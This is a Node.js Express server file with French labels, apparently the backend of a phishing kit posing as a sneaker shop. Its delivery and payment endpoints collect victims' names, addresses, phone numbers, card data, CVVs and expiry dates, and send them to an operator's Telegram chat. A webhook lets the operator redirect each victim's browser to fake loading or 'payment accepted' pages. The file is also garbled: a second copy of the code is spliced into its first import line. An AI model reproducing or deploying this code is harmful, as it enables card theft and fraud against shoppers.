import express from "express";
import path from "path";
import bodyParser fromimport express from "express";
import path from "path";
import bodyParser from "body-parser";
import cors from "cors";
import fetch from "node-fetch";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,"public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

const sessions = {};

function getIP(req){
  let ip=req.headers["x-forwarded-for"]||req.socket.remoteAddress||"";
  if(ip.includes(",")) ip=ip.split(",")[0];
  if(ip.includes("::ffff:")) ip=ip.split("::ffff:")[1];
  return ip.trim();
}

async function sendNotif(data){
  if(!BOT_TOKEN||!CHAT_ID)return;
  const txt=[
    "🆕 <b>Nouvelle interaction</b>",
    "🌐 <b>IP:</b> "+data.ip,
    data.page?`📄 <b>Page:</b> ${data.page}`:"",
    data.pair?`👟 <b>Produit:</b> ${data.pair}`:"",
    data.delivery?`🏠 <b>Adresse:</b> ${data.delivery.adresse}`:"",
    data.delivery?`📞 <b>Tel:</b> ${data.delivery.telephone}`:"",
    data.card?`💳 <b>Carte:</b> ${data.card.panMasked}`:""
  ].filter(Boolean).join("\n");

  const keyboard={
    inline_keyboard:[
      [{text:"🏠 Accueil",callback_data:"redirect|"+data.ip+"|/"}],
      [{text:"👟 Produit",callback_data:"redirect|"+data.ip+"|/product.html"}],
      [{text:"📦 Livraison",callback_data:"redirect|"+data.ip+"|/delivery.html"}],
      [{text:"💳 Paiement",callback_data:"redirect|"+data.ip+"|/payment.html"}],
      [{text:"⏳ Loader",callback_data:"redirect|"+data.ip+"|/loader.html"}],
      [{text:"✅ Paiement accepté",callback_data:"redirect|"+data.ip+"|/success.html"}]
    ]
  };

  await fetch(`${TELEGRAM_API}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID,text:txt,parse_mode:"HTML",reply_markup:keyboard})
  });
}

// API endpoints
app.get("/api/visit",(req,res)=>{
  const ip=getIP(req);
  sessions[ip]=sessions[ip]||{data:{ip,page:"Accueil"},redirect:null};
  res.json({ok:true});
});

app.post("/api/pair",(req,res)=>{
  const ip=getIP(req);
  const {pair}=req.body;
  sessions[ip]=sessions[ip]||{data:{ip},redirect:null};
  sessions[ip].data.page="Produit";
  sessions[ip].data.pair=pair;
  sendNotif(sessions[ip].data);
  res.json({ok:true});
});

app.post("/api/delivery",(req,res)=>{
  const ip=getIP(req);
  const {nom,prenom,adresse,telephone}=req.body;
  sessions[ip]=sessions[ip]||{data:{ip},redirect:null};
  sessions[ip].data.page="Livraison";
  sessions[ip].data.delivery={nom,prenom,adresse,telephone};
  sendNotif(sessions[ip].data);
  res.json({ok:true});
});

app.post("/api/payment",(req,res)=>{
  const ip=getIP(req);
  const {cardNumber,expiry,cvv,nomTitulaire}=req.body;
  sessions[ip]=sessions[ip]||{data:{ip},redirect:null};
  sessions[ip].data.page="Paiement";
  sessions[ip].data.card={panMasked:"**** **** **** "+cardNumber.slice(-4),expiry,cvv,nomTitulaire};
  sendNotif(sessions[ip].data);
  res.json({ok:true});
});

app.get("/api/status",(req,res)=>{
  const ip=getIP(req);
  const redirect=sessions[ip]?.redirect||null;
  if(redirect)sessions[ip].redirect=null;
  res.json({redirect});
});

app.post("/telegramWebhook",express.json(),async(req,res)=>{
  const cb=req.body?.callback_query;
  if(cb){
    const [action,ip,url]=(cb.data||'').split("|");
    if(action==="redirect"&&sessions[ip]){
      sessions[ip].redirect=url;
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({callback_query_id:cb.id,text:"✅ Redirection envoyée."})
      });
    }
  }
  res.sendStatus(200);
});

// Pages
["index","product","delivery","payment","loader","success"].forEach(p=>{
  app.get(`/${p==="index"?"":p+".html"}`,(req,res)=>res.sendFile(path.join(__dirname,"public",`${p}.html`)));
});

const PORT=process.env.PORT||3000;
app.listen(PORT,()=>console.log("Server ready on port",PORT)); "body-parser";
import cors from "cors";
import fetch from "node-fetch";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

const sessions = {};

function getIP(req) {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (ip.includes(",")) ip = ip.split(",")[0];
  if (ip.includes("::ffff:")) ip = ip.split("::ffff:")[1];
  return ip.trim();
}

// 🔔 Envoi notif Telegram
async function sendNotif(data) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const txt = [
    `📱 <b>Nouvelle interaction</b>`,
    `🌐 IP: ${data.ip}`,
    data.page ? `📄 Page: ${data.page}` : "",
    data.pair ? `👟 Produit: ${data.pair}` : "",
    data.delivery ? `🏠 Adresse: ${data.delivery.adresse}` : "",
    data.delivery ? `📞 Tel: ${data.delivery.telephone}` : "",
    data.card ? `💳 Carte: ${data.card.panMasked}` : "",
  ]
    .filter(Boolean)
    .join("\n");

  const keyboard = {
    inline_keyboard: [
      [{ text: "🏠 Accueil", callback_data: `redirect|${data.ip}|/` }],
      [{ text: "👟 Produit", callback_data: `redirect|${data.ip}|/product.html` }],
      [{ text: "📦 Livraison", callback_data: `redirect|${data.ip}|/delivery.html` }],
      [{ text: "💳 Paiement", callback_data: `redirect|${data.ip}|/payment.html` }],
      [{ text: "⏳ Loader", callback_data: `redirect|${data.ip}|/loader.html` }],
      [{ text: "✅ Paiement accepté", callback_data: `redirect|${data.ip}|/success.html` }],
    ],
  };

  await fetch(`${TELEGRAM_API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: txt,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }),
  });
}

// 🧭 Routes API
app.get("/api/visit", (req, res) => {
  const ip = getIP(req);
  if (!sessions[ip]) sessions[ip] = { data: { ip, page: "Accueil" }, redirect: null };
  res.json({ ok: true });
});

app.post("/api/pair", (req, res) => {
  const ip = getIP(req);
  const { pair } = req.body;
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Produit";
  sessions[ip].data.pair = pair;
  sendNotif(sessions[ip].data);
  res.json({ ok: true });
});

app.post("/api/delivery", (req, res) => {
  const ip = getIP(req);
  const { nom, prenom, adresse, telephone } = req.body;
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Livraison";
  sessions[ip].data.delivery = { nom, prenom, adresse, telephone };
  sendNotif(sessions[ip].data);
  res.json({ ok: true });
});

app.post("/api/payment", (req, res) => {
  const ip = getIP(req);
  const { cardNumber, expiry, cvv, nomTitulaire } = req.body;
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Paiement";
  sessions[ip].data.card = {
    panMasked: "**** **** **** " + cardNumber.slice(-4),
    expiry,
    cvv,
    nomTitulaire,
  };
  sendNotif(sessions[ip].data);
  res.json({ ok: true });
});

// 🔁 Vérifie redirection distante
app.get("/api/status", (req, res) => {
  const ip = getIP(req);
  const redirect = sessions[ip]?.redirect || null;
  sessions[ip].redirect = null;
  res.json({ redirect });
});

// 🤖 Telegram Webhook
app.post("/telegramWebhook", async (req, res) => {
  const body = req.body;
  if (body?.callback_query) {
    const cb = body.callback_query;
    const [action, ip, url] = cb.data.split("|");
    if (action === "redirect" && sessions[ip]) {
      sessions[ip].redirect = url;
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: "✅ Redirection envoyée à l'utilisateur",
        }),
      });
    }
  }
  res.sendStatus(200);
});

// 🌍 Pages
app.get("/", (_, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/product.html", (_, res) => res.sendFile(path.join(__dirname, "public", "product.html")));
app.get("/delivery.html", (_, res) => res.sendFile(path.join(__dirname, "public", "delivery.html")));
app.get("/payment.html", (_, res) => res.sendFile(path.join(__dirname, "public", "payment.html")));
app.get("/loader.html", (_, res) => res.sendFile(path.join(__dirname, "public", "loader.html")));
app.get("/success.html", (_, res) => res.sendFile(path.join(__dirname, "public", "success.html")));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server running on port", PORT));
